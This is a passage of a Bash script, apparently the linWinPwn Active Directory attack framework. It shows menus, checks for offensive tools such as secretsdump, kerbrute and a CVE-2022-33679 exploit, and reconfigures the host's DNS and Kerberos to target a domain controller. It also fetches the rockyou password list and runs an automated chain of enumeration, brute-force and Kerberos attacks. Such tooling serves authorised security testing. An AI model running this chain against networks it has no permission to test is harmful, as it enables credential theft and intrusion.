                    echo -e "${GREEN}[+] Re-run linWinPwn to use certificate instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -C ${pem_cert}"
                else
                    echo -e "${RED}[-] Failed to request certificate${NC}"
                fi
            else
                echo -e "${RED}[-] Error! Requires password, NTLM hash, AES key or Kerberos ticket...${NC}"
            fi
        fi
        auth_menu
        ;;

    back)
        init_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        auth_menu
        ;;
    esac
}

config_menu() {
    echo -e ""
    echo -e "${YELLOW}[Config menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------"
    echo -e "1) Check installation of tools and dependencies"
    echo -e "2) Synchronize time with Domain Controller (requires root)"
    echo -e "3) Add Domain Controller's IP and Domain to /etc/hosts (requires root)"
    echo -e "4) Update resolv.conf to define Domain Controller as DNS server (requires root)"
    echo -e "5) Update krb5.conf to define realm and KDC for Kerberos (requires root)"
    echo -e "6) Download default username and password wordlists (non-kali machines)"
    echo -e "7) Change users wordlist file"
    echo -e "8) Change passwords wordlist file"
    echo -e "9) Change attacker's IP"
    echo -e "10) Switch between LDAP (port 389) and LDAPS (port 636)"
    echo -e "11) Show session information"
    echo -e "back) Go back to Init Menu"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    1)
        echo -e ""
        if [ ! -f "${impacket_findDelegation}" ]; then echo -e "${RED}[-] impacket's findDelegation is not installed${NC}"; else echo -e "${GREEN}[+] impacket's findDelegation is installed${NC}"; fi
        if [ ! -f "${impacket_GetUserSPNs}" ]; then echo -e "${RED}[-] impacket's GetUserSPNs is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetUserSPNs is installed${NC}"; fi
        if [ ! -f "${impacket_secretsdump}" ]; then echo -e "${RED}[-] impacket's secretsdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's secretsdump is installed${NC}"; fi
        if [ ! -f "${impacket_GetNPUsers}" ]; then echo -e "${RED}[-] impacket's GetNPUsers is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetNPUsers is installed${NC}"; fi
        if [ ! -f "${impacket_getTGT}" ]; then echo -e "${RED}[-] impacket's getTGT is not installed${NC}"; else echo -e "${GREEN}[+] impacket's getTGT is installed${NC}"; fi
        if [ ! -f "${impacket_goldenPac}" ]; then echo -e "${RED}[-] impacket's goldenPac is not installed${NC}"; else echo -e "${GREEN}[+] impacket's goldenPac is installed${NC}"; fi
        if [ ! -f "${impacket_rpcdump}" ]; then echo -e "${RED}[-] impacket's rpcdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's rpcdump is installed${NC}"; fi
        if [ ! -f "${impacket_reg}" ]; then echo -e "${RED}[-] impacket's reg is not installed${NC}"; else echo -e "${GREEN}[+] impacket's reg is installed${NC}"; fi
        if [ ! -f "${impacket_ticketer}" ]; then echo -e "${RED}[-] impacket's ticketer is not installed${NC}"; else echo -e "${GREEN}[+] impacket's ticketer is installed${NC}"; fi
        if [ ! -f "${impacket_getST}" ]; then echo -e "${RED}[-] impacket's getST is not installed${NC}"; else echo -e "${GREEN}[+] impacket's getST is installed${NC}"; fi
        if [ ! -f "${impacket_raiseChild}" ]; then echo -e "${RED}[-] impacket's raiseChild is not installed${NC}"; else echo -e "${GREEN}[+] impacket's raiseChild is installed${NC}"; fi
        if [ ! -f "${impacket_smbpasswd}" ]; then echo -e "${RED}[-] impacket's smbpasswd is not installed${NC}"; else echo -e "${GREEN}[+] impacket's smbpasswd is installed${NC}"; fi
        if [ ! -f "${bloodhound}" ]; then echo -e "${RED}[-] bloodhound is not installed${NC}"; else echo -e "${GREEN}[+] bloodhound is installed${NC}"; fi
        if [ ! -f "${ldapdomaindump}" ]; then echo -e "${RED}[-] ldapdomaindump is not installed${NC}"; else echo -e "${GREEN}[+] ldapdomaindump is installed${NC}"; fi
        if [ ! -f "${netexec}" ]; then echo -e "${RED}[-] netexec is not installed${NC}"; else echo -e "${GREEN}[+] netexec is installed${NC}"; fi
        if [ ! -f "${john}" ]; then echo -e "${RED}[-] john is not installed${NC}"; else echo -e "${GREEN}[+] john is installed${NC}"; fi
        if [ ! -f "${smbmap}" ]; then echo -e "${RED}[-] smbmap is not installed${NC}"; else echo -e "${GREEN}[+] smbmap is installed${NC}"; fi
        if [ ! -f "${nmap}" ]; then echo -e "${RED}[-] nmap is not installed${NC}"; else echo -e "${GREEN}[+] nmap is installed${NC}"; fi
        if [ ! -f "${adidnsdump}" ]; then echo -e "${RED}[-] adidnsdump is not installed${NC}"; else echo -e "${GREEN}[+] adidnsdump is installed${NC}"; fi
        if [ ! -f "${certi_py}" ]; then echo -e "${RED}[-] certi_py is not installed${NC}"; else echo -e "${GREEN}[+] certi_py is installed${NC}"; fi
        if [ ! -f "${certipy}" ]; then echo -e "${RED}[-] certipy is not installed${NC}"; else echo -e "${GREEN}[+] certipy is installed${NC}"; fi
        if [ ! -f "${ldeep}" ]; then echo -e "${RED}[-] ldeep is not installed${NC}"; else echo -e "${GREEN}[+] ldeep is installed${NC}"; fi
        if [ ! -f "${pre2k}" ]; then echo -e "${RED}[-] pre2k is not installed${NC}"; else echo -e "${GREEN}[+] pre2k is installed${NC}"; fi
        if [ ! -f "${certsync}" ]; then echo -e "${RED}[-] certsync is not installed${NC}"; else echo -e "${GREEN}[+] certsync is installed${NC}"; fi
        if [ ! -f "${windapsearch}" ]; then echo -e "${RED}[-] windapsearch is not installed${NC}"; else echo -e "${GREEN}[+] windapsearch is installed${NC}"; fi
        if [ ! -x "${windapsearch}" ]; then echo -e "${RED}[-] windapsearch is not executable${NC}"; else echo -e "${GREEN}[+] windapsearch is executable${NC}"; fi
        if [ ! -f "${enum4linux_py}" ]; then echo -e "${RED}[-] enum4linux-ng is not installed${NC}"; else echo -e "${GREEN}[+] enum4linux-ng is installed${NC}"; fi
        if [ ! -x "${enum4linux_py}" ]; then echo -e "${RED}[-] enum4linux-ng is not executable${NC}"; else echo -e "${GREEN}[+] enum4linux-ng is executable${NC}"; fi
        if [ ! -f "${kerbrute}" ]; then echo -e "${RED}[-] kerbrute is not installed${NC}"; else echo -e "${GREEN}[+] kerbrute is installed${NC}"; fi
        if [ ! -x "${kerbrute}" ]; then echo -e "${RED}[-] kerbrute is not executable${NC}"; else echo -e "${GREEN}[+] kerbrute is executable${NC}"; fi
        if [ ! -f "${targetedKerberoast}" ]; then echo -e "${RED}[-] targetedKerberoast is not installed${NC}"; else echo -e "${GREEN}[+] targetedKerberoast is installed${NC}"; fi
        if [ ! -x "${targetedKerberoast}" ]; then echo -e "${RED}[-] targetedKerberoast is not executable${NC}"; else echo -e "${GREEN}[+] targetedKerberoast is executable${NC}"; fi
        if [ ! -f "${CVE202233679}" ]; then echo -e "${RED}[-] CVE-2022-33679 is not installed${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is installed${NC}"; fi
        if [ ! -x "${CVE202233679}" ]; then echo -e "${RED}[-] CVE-2022-33679 is not executable${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is executable${NC}"; fi
        if [ ! -f "${silenthound}" ]; then echo -e "${RED}[-] silenthound is not installed${NC}"; else echo -e "${GREEN}[+] silenthound is installed${NC}"; fi
        if [ ! -f "${silenthound}" ]; then echo -e "${RED}[-] silenthound is not installed${NC}"; else echo -e "${GREEN}[+] silenthound is installed${NC}"; fi
        if [ ! -f "${donpapi}" ]; then echo -e "${RED}[-] DonPAPI is not installed${NC}"; else echo -e "${GREEN}[+] DonPAPI is installed${NC}"; fi
        if [ ! -f "${hekatomb}" ]; then echo -e "${RED}[-] HEKATOMB is not installed${NC}"; else echo -e "${GREEN}[+] hekatomb is installed${NC}"; fi
        if [ ! -f "${FindUncommonShares}" ]; then echo -e "${RED}[-] FindUncommonShares is not installed${NC}"; else echo -e "${GREEN}[+] FindUncommonShares is installed${NC}"; fi
        if [ ! -x "${FindUncommonShares}" ]; then echo -e "${RED}[-] FindUncommonShares is not executable${NC}"; else echo -e "${GREEN}[+] FindUncommonShares is executable${NC}"; fi
        if [ ! -f "${ExtractBitlockerKeys}" ]; then echo -e "${RED}[-] ExtractBitlockerKeys is not installed${NC}"; else echo -e "${GREEN}[+] ExtractBitlockerKeys is installed${NC}"; fi
        if [ ! -x "${ExtractBitlockerKeys}" ]; then echo -e "${RED}[-] ExtractBitlockerKeys is not executable${NC}"; else echo -e "${GREEN}[+] ExtractBitlockerKeys is executable${NC}"; fi
        if [ ! -f "${ldapconsole}" ]; then echo -e "${RED}[-] ldapconsole is not installed${NC}"; else echo -e "${GREEN}[+] ldapconsole is installed${NC}"; fi
        if [ ! -x "${ldapconsole}" ]; then echo -e "${RED}[-] ldapconsole is not executable${NC}"; else echo -e "${GREEN}[+] ldapconsole is executable${NC}"; fi
        if [ ! -f "${pyLDAPmonitor}" ]; then echo -e "${RED}[-] pyLDAPmonitor is not installed${NC}"; else echo -e "${GREEN}[+] pyLDAPmonitor is installed${NC}"; fi
        if [ ! -x "${pyLDAPmonitor}" ]; then echo -e "${RED}[-] pyLDAPmonitor is not executable${NC}"; else echo -e "${GREEN}[+] pyLDAPmonitor is executable${NC}"; fi
        if [ ! -f "${LDAPWordlistHarvester}" ]; then echo -e "${RED}[-] LDAPWordlistHarvester is not installed${NC}"; else echo -e "${GREEN}[+] LDAPWordlistHarvester is installed${NC}"; fi
        if [ ! -x "${LDAPWordlistHarvester}" ]; then echo -e "${RED}[-] LDAPWordlistHarvester is not executable${NC}"; else echo -e "${GREEN}[+] LDAPWordlistHarvester is executable${NC}"; fi
        if [ ! -f "${rdwatool}" ]; then echo -e "${RED}[-] rdwatool is not installed${NC}"; else echo -e "${GREEN}[+] rdwatool is installed${NC}"; fi
        if [ ! -f "${manspider}" ]; then echo -e "${RED}[-] manspider is not installed${NC}"; else echo -e "${GREEN}[+] manspider is installed${NC}"; fi
        if [ ! -f "${coercer}" ]; then echo -e "${RED}[-] coercer is not installed${NC}"; else echo -e "${GREEN}[+] coercer is installed${NC}"; fi
        if [ ! -f "${bloodyad}" ]; then echo -e "${RED}[-] bloodyad is not installed${NC}"; else echo -e "${GREEN}[+] bloodyad is installed${NC}"; fi
        if [ ! -f "${aced}" ]; then echo -e "${RED}[-] aced is not installed${NC}"; else echo -e "${GREEN}[+] aced is installed${NC}"; fi
        if [ ! -f "${sccmhunter}" ]; then echo -e "${RED}[-] sccmhunter is not installed${NC}"; else echo -e "${GREEN}[+] sccmhunter is installed${NC}"; fi
        if [ ! -f "${krbjack}" ]; then echo -e "${RED}[-] krbjack is not installed${NC}"; else echo -e "${GREEN}[+] krbjack is installed${NC}"; fi
        if [ ! -f "${ldapper}" ]; then echo -e "${RED}[-] ldapper is not installed${NC}"; else echo -e "${GREEN}[+] ldapper is installed${NC}"; fi
        if [ ! -f "${orpheus}" ]; then echo -e "${RED}[-] orpheus is not installed${NC}"; else echo -e "${GREEN}[+] orpheus is installed${NC}"; fi
        if [ ! -f "${adalanche}" ]; then echo -e "${RED}[-] adalanche is not installed${NC}"; else echo -e "${GREEN}[+] adalanche is installed${NC}"; fi
        if [ ! -x "${adalanche}" ]; then echo -e "${RED}[-] adalanche is not executable${NC}"; else echo -e "${GREEN}[+] adalanche is executable${NC}"; fi
        if [ ! -f "${mssqlrelay}" ]; then echo -e "${RED}[-] mssqlrelay is not installed${NC}"; else echo -e "${GREEN}[+] mssqlrelay is installed${NC}"; fi
        if [ ! -f "${pygpoabuse}" ]; then echo -e "${RED}[-] pygpoabuse is not installed${NC}"; else echo -e "${GREEN}[+] pygpoabuse is installed${NC}"; fi
        if [ ! -x "${pygpoabuse}" ]; then echo -e "${RED}[-] pygpoabuse is not executable${NC}"; else echo -e "${GREEN}[+] pygpoabuse is executable${NC}"; fi
        if [ ! -f "${GPOwned}" ]; then echo -e "${RED}[-] GPOwned is not installed${NC}"; else echo -e "${GREEN}[+] GPOwned is installed${NC}"; fi
        if [ ! -x "${GPOwned}" ]; then echo -e "${RED}[-] GPOwned is not executable${NC}"; else echo -e "${GREEN}[+] GPOwned is executable${NC}"; fi
        if [ ! -f "${privexchange}" ]; then echo -e "${RED}[-] privexchange is not installed${NC}"; else echo -e "${GREEN}[+] privexchange is installed${NC}"; fi
        if [ ! -x "${privexchange}" ]; then echo -e "${RED}[-] privexchange is not executable${NC}"; else echo -e "${GREEN}[+] privexchange is executable${NC}"; fi
        if [ ! -f "${RunFinger}" ]; then echo -e "${RED}[-] RunFinger is not installed${NC}"; else echo -e "${GREEN}[+] RunFinger is installed${NC}"; fi
        if [ ! -x "${RunFinger}" ]; then echo -e "${RED}[-] RunFinger is not executable${NC}"; else echo -e "${GREEN}[+] RunFinger is executable${NC}"; fi
        if [ ! -f "${adPEAS}" ]; then echo -e "${RED}[-] adPEAS is not installed${NC}"; else echo -e "${GREEN}[+] adPEAS is installed${NC}"; fi
        if [ ! -f "${breads}" ]; then echo -e "${RED}[-] breads is not installed${NC}"; else echo -e "${GREEN}[+] breads is installed${NC}"; fi
        if [ ! -f "${ADCheck}" ]; then echo -e "${RED}[-] ADCheck is not installed${NC}"; else echo -e "${GREEN}[+] ADCheck is installed${NC}"; fi
        if [ ! -x "${ADCheck}" ]; then echo -e "${RED}[-] ADCheck is not executable${NC}"; else echo -e "${GREEN}[+] ADCheck is executable${NC}"; fi
        if [ ! -f "${smbclientng}" ]; then echo -e "${RED}[-] smbclientng is not installed${NC}"; else echo -e "${GREEN}[+] smbclientng is installed${NC}"; fi
        if [ ! -f "${ldapnomnom}" ]; then echo -e "${RED}[-] ldapnomnom is not installed${NC}"; else echo -e "${GREEN}[+] ldapnomnom is installed${NC}"; fi
        if [ ! -x "${ldapnomnom}" ]; then echo -e "${RED}[-] ldapnomnom is not executable${NC}"; else echo -e "${GREEN}[+] ldapnomnom is executable${NC}"; fi
        config_menu
        ;;

    2)
        echo -e ""
        sudo timedatectl set-ntp 0
        sudo ntpdate "${dc_ip}"
        echo -e "${GREEN}[+] NTP sync complete${NC}"
        config_menu
        ;;

    3)
        echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
        echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
        echo -e "${GREEN}[+] /etc/hosts update complete${NC}"
        config_menu
        ;;

    4)
        echo -e ""
        date "+%Y-%m-%d\ %H:%M:%S" | tee -a "${output_dir}/resolv.conf.backup"
        echo -e "Content of /etc/resolv.conf before update:" | tee -a "${output_dir}/resolv.conf.backup"
        echo -e "------------------------------------------" | tee -a "${output_dir}/resolv.conf.backup"
        tee -a "${output_dir}/resolv.conf.backup" </etc/resolv.conf
        echo -e "" | tee -a "${output_dir}/resolv.conf.backup"
        echo -e "Content of /etc/resolv.conf after update:"
        echo -e "-----------------------------------------"
        sudo sed -i '/^#/! s/^/#/g' /etc/resolv.conf
        echo -e "nameserver ${dc_ip}" | sudo tee -a /etc/resolv.conf
        echo -e "${GREEN}[+] DNS update complete${NC}"
        config_menu
        ;;

    5)
        echo -e ""
        date "+%Y-%m-%d\ %H:%M:%S" | tee -a "${output_dir}/krb5.conf.backup"
        echo -e "Content of /etc/krb5.conf before update:" | tee -a "${output_dir}/krb5.conf.backup"
        echo -e "----------------------------------------" | tee -a "${output_dir}/krb5.conf.backup"
        tee -a "${output_dir}/krb5.conf.backup" </etc/krb5.conf
        echo -e "" | tee -a "${output_dir}/krb5.conf.backup"
        echo -e "Content of /etc/krb5.conf after update:"
        echo -e "---------------------------------------"
        echo -e "[libdefaults]" | sudo tee /etc/krb5.conf
        echo -e "        default_realm = ${domain^^}" | sudo tee -a /etc/krb5.conf
        echo -e "" | sudo tee -a /etc/krb5.conf
        echo -e "# The following krb5.conf variables are only for MIT Kerberos." | sudo tee -a /etc/krb5.conf
        echo -e "        kdc_timesync = 1" | sudo tee -a /etc/krb5.conf
        echo -e "        ccache_type = 4" | sudo tee -a /etc/krb5.conf
        echo -e "        forwardable = true" | sudo tee -a /etc/krb5.conf
        echo -e "        proxiable = true" | sudo tee -a /etc/krb5.conf
        echo -e "        rdns = false" | sudo tee -a /etc/krb5.conf
        echo -e "" | sudo tee -a /etc/krb5.conf
        echo -e "" | sudo tee -a /etc/krb5.conf
        echo -e "# The following libdefaults parameters are only for Heimdal Kerberos." | sudo tee -a /etc/krb5.conf
        echo -e "        fcc-mit-ticketflags = true" | sudo tee -a /etc/krb5.conf
        echo -e "" | sudo tee -a /etc/krb5.conf
        echo -e "[realms]" | sudo tee -a /etc/krb5.conf
        echo -e "        ${domain^^} = {" | sudo tee -a /etc/krb5.conf
        echo -e "                kdc = ${dc_FQDN}" | sudo tee -a /etc/krb5.conf
        echo -e "        }" | sudo tee -a /etc/krb5.conf
        echo -e "" | sudo tee -a /etc/krb5.conf
        echo -e "[domain_realm]" | sudo tee -a /etc/krb5.conf
        echo -e "        .${domain} = ${domain^^}" | sudo tee -a /etc/krb5.conf
        echo -e "${GREEN}[+] KRB5 config update complete${NC}"
        config_menu
        ;;

    6)
        echo -e ""
        sudo mkdir -p "${wordlists_dir} "
        sudo chown -R "$(whoami)" "${wordlists_dir}"
        wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz" -O "${wordlists_dir}/rockyou.txt.tar.gz"
        gunzip "${wordlists_dir}/rockyou.txt.tar.gz"
        tar xf "${wordlists_dir}/rockyou.txt.tar" -C "${wordlists_dir}/"
        chmod 644 "${wordlists_dir}/rockyou.txt"
        /bin/rm "${wordlists_dir}/rockyou.txt.tar"
        wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt" -O "${wordlists_dir}/cirt-default-usernames.txt"
        pass_wordlist="${wordlists_dir}/rockyou.txt"
        user_wordlist="${wordlists_dir}/xato-net-10-million-usernames.txt"
        echo -e "${GREEN}[+] Default username and password wordlists downloaded${NC}"
        config_menu
        ;;

    7)
        echo -e "Please specify new users wordlist file:"
        read -rp ">> " user_wordlist </dev/tty
        echo -e "${GREEN}[+] Users wordlist file updated${NC}"
        config_menu
        ;;

    8)
        echo -e "Please specify new passwords wordlist file:"
        read -rp ">> " pass_wordlist </dev/tty
        echo -e "${GREEN}[+] Passwords wordlist file updated${NC}"
        config_menu
        ;;

    9)
        echo ""
        set_attackerIP
        config_menu
        ;;

    10)
        echo ""
        if [ "${ldaps_bool}" == false ]; then
            ldaps_bool=true
            echo -e "${GREEN}[+] Switched to using LDAPS on port 636${NC}"

        else
            ldaps_bool=false
            echo -e "${GREEN}[+] Switched to using LDAP on port 389${NC}"
        fi
        config_menu
        ;;

    11)
        echo ""
        print_info
        config_menu
        ;;

    back)
        init_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        config_menu
        ;;
    esac
}

main_menu() {
    echo -e ""
    echo -e "${PURPLE}[Main menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------"
    echo -e "1) Re-run DNS Enumeration using adidnsdump"
    echo -e "2) Active Directory Enumeration Menu"
    echo -e "3) ADCS Enumeration Menu"
    echo -e "4) Brute Force Attacks Menu"
    echo -e "5) Kerberos Attacks Menu"
    echo -e "6) SMB shares Enumeration Menu"
    echo -e "7) Vulnerability Checks Menu"
    echo -e "8) MSSQL Enumeration Menu"
    echo -e "9) Password Dump Menu"
    echo -e "10) AD Objects or Attributes Modification Menu"
    echo -e "11) Command Execution Menu"
    echo -e "back) Go back to Init Menu"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in

    1)
        /bin/rm "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null
        dns_enum
        main_menu
        ;;

    2)
        ad_menu
        ;;

    3)
        adcs_menu
        ;;

    4)
        bruteforce_menu
        ;;

    5)
        kerberos_menu
        ;;

    6)
        shares_menu
        ;;

    7)
        vulns_menu
        ;;

    8)
        mssql_menu
        ;;

    9)
        pwd_menu
        ;;

    10)
        modif_menu
        ;;

    11)
        cmdexec_menu
        ;;

    back)
        init_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        main_menu
        ;;
    esac
}

main() {
    print_banner
    prepare
    print_info
    authenticate
    sid_domain=$(grep -a "Domain SID" "${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" 2>/dev/null | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
    if [[ ${sid_domain} == "" ]]; then
        run_command "${netexec} ldap ${target} ${argument_ne} --get-sid --log ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" >/dev/null
        sid_domain=$(grep -a "Domain SID" "${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
    fi
    echo -e "${YELLOW}[i]${NC} SID of Domain: ${YELLOW}${sid_domain}${NC}"
    echo -e ""
    if [ "${interactive_bool}" == true ]; then
        init_menu
    else
        dns_enum
        echo -e "${GREEN}[+] Start: Active Directory Enumeration${NC}"
        echo -e "${GREEN}---------------------------------------${NC}"
        echo -e ""
        ad_enum
        echo -e "${GREEN}[+] Start: ADCS Enumeration${NC}"
        echo -e "${GREEN}---------------------------${NC}"
        echo -e ""
        adcs_enum
        echo -e "${GREEN}[+] Start: User and password Brute force Attacks${NC}"
        echo -e "${GREEN}------------------------------------------------${NC}"
        echo -e ""
        bruteforce
        echo -e "${GREEN}[+] Start: Kerberos-based Attacks${NC}"
        echo -e "${GREEN}----------------------------------${NC}"
        echo -e ""
        kerberos
        echo -e "${GREEN}[+] Start: Network Shares Scan${NC}"
        echo -e "${GREEN}------------------------------${NC}"
        echo -e ""
        scan_shares
        echo -e "${GREEN}[+] Start: Vulnerability Checks${NC}"
        echo -e "${GREEN}-------------------------------${NC}"
        echo -e ""
        vuln_checks
        echo -e "${GREEN}[+] Start: MSSQL Enumeration${NC}"
        echo -e "${GREEN}----------------------------${NC}"
        echo -e ""
        mssql_checks
        echo -e ""
        echo -e "${GREEN}[+] Automatic enumeration has completed. Output folder is: ${output_dir}${NC}"
        echo -e "${GREEN}---------------------------------------------------------${NC}"

    fi
}

main
